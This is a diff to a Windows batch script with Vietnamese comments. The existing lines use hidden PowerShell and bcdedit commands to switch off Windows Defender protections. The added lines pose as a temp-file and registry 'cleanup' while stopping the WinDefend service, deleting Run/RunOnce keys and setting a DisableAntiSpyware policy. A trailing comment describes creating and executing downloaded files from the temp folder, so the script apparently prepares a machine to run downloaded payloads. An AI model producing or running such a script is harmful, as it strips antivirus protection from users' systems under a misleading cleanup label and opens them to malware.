@@ -13,7 +13,32 @@ bcdedit /set disableelamdrivers yes
 powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"
 powershell -WindowStyle Hidden -Command "Set-MpPreference -SubmitSamplesConsent 2"
 
-echo Windows Defender đã được vô hiệu hóa.
+@echo off
+echo Deleting temporary files...
+del /f /s /q %temp%\*.*
+del /f /s /q %systemroot%\temp\*.*
+del /f /s /q %systemdrive%\*.tmp
+echo Temporary files deleted.
+
+echo Deleting suspicious files...
+del /f /s /q "C:\Path\To\Suspicious\File.exe"
+rem Add more lines to delete other suspicious files
+
+net stop WinDefend
+
+echo Cleaning registry...
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /f
+rem Add more lines to delete other suspicious registry entries
+echo Registry cleaned.
+
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f
+
+echo Done.
+
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+
 
 :: Tạo và thực thi các tệp tin đã tải về
 set DOWNLOAD_FOLDER=%TEMP%
